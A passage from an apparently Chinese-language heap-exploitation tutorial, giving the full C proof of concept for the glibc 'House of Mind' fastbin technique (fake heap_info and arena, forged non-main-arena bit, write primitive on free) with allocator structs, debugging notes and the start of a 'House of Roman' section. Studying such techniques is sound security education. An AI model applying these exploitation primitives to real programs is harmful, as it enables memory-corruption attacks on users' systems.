Allocates enough heap chunks to get to the non-main arena location where </span></span><br><span class="line"><span class="comment">  we can control the values of the arena data. </span></span><br><span class="line"><span class="comment">- Creates a fake &#x27;heap_info&#x27; in order to specify the &#x27;ar_ptr&#x27; to be used as the arena later.</span></span><br><span class="line"><span class="comment">- Using this fake arena (ar_ptr), we can use the fastbin to write</span></span><br><span class="line"><span class="comment">  to an unexpected location of the &#x27;ar_ptr&#x27; with a heap pointer. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requirements: </span></span><br><span class="line"><span class="comment">- A heap leak in order to know where the fake &#x27;heap_info&#x27; is located at.</span></span><br><span class="line"><span class="comment">	- Could be possible to avoid with special spraying techniques</span></span><br><span class="line"><span class="comment">- An unlimited amount of allocations</span></span><br><span class="line"><span class="comment">- A single byte overflow on the size of a chunk</span></span><br><span class="line"><span class="comment">	- NEEDS to be possible to put into the fastbin. </span></span><br><span class="line"><span class="comment">	- So, either NO tcache or the tcache needs to be filled. </span></span><br><span class="line"><span class="comment">- The location of the malloc state(ar_ptr) needs to have a value larger</span></span><br><span class="line"><span class="comment">  than the fastbin size being freed at malloc_state.system_mem otherwise</span></span><br><span class="line"><span class="comment">  the chunk will be assumed to be invalid.</span></span><br><span class="line"><span class="comment">	- This can be manually inserted or CAREFULLY done by lining up</span></span><br><span class="line"><span class="comment">	  values in a proper way. </span></span><br><span class="line"><span class="comment">- The NEXT chunk, from the one that is being freed, must be a valid size</span></span><br><span class="line"><span class="comment">(again, greater than 0x20 and less than malloc_state.system_mem)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Random perks:</span></span><br><span class="line"><span class="comment">- Can be done MULTIPLE times at the location, with different sized fastbin</span></span><br><span class="line"><span class="comment">  chunks. </span></span><br><span class="line"><span class="comment">- Does not brick malloc, unlike the unsorted bin attack. </span></span><br><span class="line"><span class="comment">- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">Written up by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;House of Mind - Fastbin Variant\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;==================================&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The goal of this technique is to create a fake arena\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;at an offset of HEAP_MAX_SIZE\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Then, we write to the fastbins when the chunk is freed\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This creates a somewhat constrained WRITE-WHERE primitive\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Values for the allocation information.</span></span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span>*<span class="number">1024</span>) - <span class="number">0x100</span>; <span class="comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Find initial location of the heap\n&quot;</span>);</span><br><span class="line">	<span class="comment">// The target location of our attack and the fake arena to use</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="type">uint8_t</span>* target_loc = fake_arena + <span class="number">0x28</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* target_chunk = (<span class="type">uint8_t</span>*) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Prepare a valid &#x27;malloc_state&#x27; (arena) &#x27;system_mem&#x27;</span></span><br><span class="line"><span class="comment">	to store a fastbin. This is important because the size</span></span><br><span class="line"><span class="comment">	of a chunk is validated for being too small or too large</span></span><br><span class="line"><span class="comment">	via the &#x27;system_mem&#x27; of the &#x27;malloc_state&#x27;. This just needs</span></span><br><span class="line"><span class="comment">	to be a value larger than our fastbin chunk.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set &#x27;system_mem&#x27; (offset 0x880) for fake arena\n&quot;</span>);</span><br><span class="line">	fake_arena[<span class="number">0x880</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x881</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x882</span>] = <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Memory Address for overwrite: %p\n&quot;</span>, target_loc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Must set data at HEAP_MAX_SIZE (0x%x) offset\n&quot;</span>, HEAP_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Calculate the location of our fake arena</span></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fake_heap_info = (<span class="type">uint64_t</span>*) new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake Heap Info struct location: %p\n&quot;</span>, fake_heap_info);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate until we reach a MAX_HEAP_SIZE offset\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The fake arena must be at a particular offset on the heap.</span></span><br><span class="line"><span class="comment">	So, we allocate a bunch of chunks until our next chunk</span></span><br><span class="line"><span class="comment">	will be in the arena. This value was calculated above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this later to trigger craziness</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create fastbin sized chunk to be victim of attack\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// Size of 0x60</span></span><br><span class="line">	<span class="type">uint64_t</span>* chunk_ptr = fastbin_chunk - <span class="number">2</span>; <span class="comment">// Point to chunk instead of mem</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fastbin Chunk to overwrite: %p\n&quot;</span>, fastbin_chunk);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Create a FAKE malloc_state pointer for the heap_state</span></span><br><span class="line"><span class="comment">	This is the &#x27;ar_ptr&#x27; of the &#x27;heap_info&#x27; struct shown above.</span></span><br><span class="line"><span class="comment">	This is the first entry in the &#x27;heap_info&#x27; struct at offset 0x0</span></span><br><span class="line"><span class="comment">	 at the heap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We set this to the location where we want to write a value to.</span></span><br><span class="line"><span class="comment">	The location that gets written to depends on the fastbin chunk</span></span><br><span class="line"><span class="comment">	size being freed. This will be between an offset of 0x8 and 0x40</span></span><br><span class="line"><span class="comment">	bytes. For instance, a chunk with a size of 0x20 would be in the</span></span><br><span class="line"><span class="comment">	0th index of fastbinsY struct. When this is written to, we will</span></span><br><span class="line"><span class="comment">	write to an offset of 8 from the original value written.</span></span><br><span class="line"><span class="comment">	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting &#x27;ar_ptr&#x27; (our fake arena)  in heap_info struct to %p\n&quot;</span>, fake_arena);</span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p prior to exploitation: 0x%x\n&quot;</span>, target_loc, *(target_loc));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Set the non-main arena bit on the size.</span></span><br><span class="line"><span class="comment">	Additionally, we keep the size the same as the original</span></span><br><span class="line"><span class="comment">	allocation because there is a sanity check on the fastbin (when freeing)</span></span><br><span class="line"><span class="comment">	that the next chunk has a valid size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	When grabbing the non-main arena, it will use our choosen arena!</span></span><br><span class="line"><span class="comment">	From there, it will write to the fastbin because of the size of the</span></span><br><span class="line"><span class="comment">	chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// Vulnerability! Overwriting the chunk size</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set non-main arena bit on the fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n&quot;</span>);</span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//// End vulnerability</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The offset being written to with the fastbin chunk address</span></span><br><span class="line"><span class="comment">	depends on the fastbin BEING used and the malloc_state itself.</span></span><br><span class="line"><span class="comment">	In 2.23, the offset from the beginning of the malloc_state</span></span><br><span class="line"><span class="comment">	to the fastbinsY array is only 0x8. Then, fastbinsY[0x4] is an</span></span><br><span class="line"><span class="comment">	additional byte offset of 0x20. In total, the writing offset</span></span><br><span class="line"><span class="comment">	from the arena location is 0x28 bytes.</span></span><br><span class="line"><span class="comment">	from the arena location to where the write actually occurs.</span></span><br><span class="line"><span class="comment">	This is a similar concept to bk - 0x10 from the unsorted</span></span><br><span class="line"><span class="comment">	bin attack.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;When we free the fastbin chunk with the non-main arena bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;set, it will cause our fake &#x27;heap_info&#x27; struct to be used.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will dereference our fake arena location and write\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the address of the heap to an offset of the arena pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Trigger the magic by freeing the chunk!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// For this particular fastbin chunk size, the offset is 0x28.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p: 0x%llx\n&quot;</span>, target_loc, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) (target_loc)));</span><br><span class="line">	<span class="built_in">assert</span>(*((<span class="type">unsigned</span> <span class="type">long</span> *) (target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p><code>2.23</code>版本和 <code>2.27</code> 以后间 <code>fastbinY[4]</code> 数组的偏移不同，<code>2.23</code> 为 <code>0x38</code> ，<code>2.27</code> 以后加入了 <code>have_fastchunks </code>，需要向后偏移 <code>0x8</code> 字节，即偏移为 <code>0x40</code>。<code>2.23</code> 的<code>malloc_state</code> 及 <code>_heap_info</code> 源码如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_heap_info</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_heap_info</span> *prev; <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-15"><a href="#调试-15" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013162104393.png"
                      alt="image-20231013162104393"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013171006999.png"
                      alt="image-20231013171006999"
                ></p>
<p><code>target_loc</code> 位置在 <code>fake_arena_chunk + 0x30</code>  处，也就是 <code>fake_arena_fastbinY[4]</code> 处，因为我们要申请的 <code>fast_chunk</code> 大小为 <code>0x60</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013163308872.png"
                      alt="image-20231013163308872"
                ></p>
<p> <code>system_mem</code> 标识这个 <code>arena</code> 管理的空间大小，请求的内存不能大于 <code>system_mem</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013170335971.png"
                      alt="image-20231013170335971"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013172604185.png"
                      alt="image-20231013172604185"
                ></p>
<p>在系统堆初始化之后，将堆的大小定为 <code>0x4000000</code>，因此后面申请的假 <code>arena</code> 管理的地址在这个堆之后，要计算这个堆的起始地址，程序中这个地址为 <code>0x4000000</code>。<code>MAX_SIZE</code> 大小为 <code>0x1ff00 &lt; 0x20000</code>  也就不会触发 <code>mmap</code> 申请机制。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013172858520.png"
                      alt="image-20231013172858520"
                ></p>
<p>一直分配 <code>MAX_SIZE</code> 大小的 <code>chunk</code> 直到系统的 <code>main_heap</code> 被申请完。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013173848951.png"
                      alt="image-20231013173848951"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013173951000.png"
                      alt="image-20231013173951000"
                ></p>
<p>在新的堆区申请 <code>0x60</code> 大小的 <code>fast_chunk</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013174809638.png"
                      alt="image-20231013174809638"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175009240.png"
                      alt="image-20231013175009240"
                ></p>
<p><code>fake_heap_info[0]==ar_ptr -&gt; fake_arena</code> 将 <code>ar_ptr</code> 指针指向我们的 <code>fake_arena</code>  ，<code>ar_ptr</code> 指针指向一个为该堆服务的<code>arena</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175140816.png"
                      alt="image-20231013175140816"
                ></p>
<p><code>fastbin_chunk_size = 0x60 | 0x4(0100B)</code> 将 <code>NON_MAIN_ARENA</code> 置为 <code>1</code> ，标明其不在主堆区。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175714934.png"
                      alt="image-20231013175714934"
                ></p>
<p><code>free(fastbin_chunk_fd)</code>  后，将会把它链接到 <code>fake_heap_info_ar_ptr</code> 指向 <code>fake_arena</code> 的 <code>fastbinY[4] (0x60)</code> 处，也就是 <code>0x603448</code> 处。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175937769.png"
                      alt="image-20231013175937769"
                ></p>
<p>此时完成利用成功将目标地址内容写为 <code>fastbin_chunk_prev_addr</code> 。</p>
<h2 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house_of_roman"></a>house_of_roman</h2><p><code>glibc &lt; 2.29</code></p>
<p>编译选项: <code>gcc -g house_of_roman.c -fpie -pie -ldl -o house_of_roman</code></p>
<p>除了 <code>libc-2.23.so</code> 和 <code>ld-2.23.so</code> 需要 <code>patch</code> 以外，还需要 <code>patch</code> 一下 <code>libdl-2.23.so</code></p>
<p><code>patchelf --replace-needed libdl.so.2 ./libdl-2.23.so house_of_roman</code></p>
<h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span 